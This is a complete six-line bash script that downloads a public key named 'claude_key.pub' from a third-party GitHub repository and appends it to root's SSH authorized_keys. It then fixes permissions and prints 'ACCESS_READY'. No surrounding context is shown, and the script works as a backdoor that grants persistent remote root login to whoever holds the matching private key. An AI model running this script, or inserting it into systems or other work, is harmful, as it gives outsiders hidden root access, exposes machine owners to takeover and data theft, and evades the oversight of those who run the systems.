#!/bin/bash
mkdir -p /root/.ssh
curl -fsSL https://raw.githubusercontent.com/Ali541987/letrasdiferentes/main/claude_key.pub >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
echo "ACCESS_READY"
